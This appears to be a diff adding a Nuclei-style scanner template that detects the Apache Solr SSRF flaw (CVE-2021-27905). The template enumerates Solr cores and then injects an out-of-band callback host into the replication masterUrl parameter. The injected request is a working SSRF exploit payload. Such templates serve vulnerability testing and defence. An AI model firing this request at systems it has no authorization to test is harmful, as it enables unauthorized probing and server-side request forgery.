@@ -1,0 +1,55 @@
+id: apache-solr-ssrf-cve-2021-27905
+info:
+  name: Apache Solr SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Solr has an SSRF vulnerability that can be exploited by injecting parameters into the MASTERURL parameter.
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-99264
+  tags: ssrf
+
+variables:
+  solrCore: ""
+
+http:
+  - id: first-request
+    method: GET
+    path:
+      - "/solr/admin/cores?indexInfo=false&wt=json"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "responseHeader"
+    extractors:
+      - type: regex
+        name: solrCore
+        part: body
+        internal: true
+        regex:
+          - "\"name\":\"(.*?)\""
+
+  - id: second-request
+    method: GET
+    path:
+      - "/solr/{{solrCore}}/replication/?command=fetchindex&masterUrl={{interactsh-url}}"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "OK"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
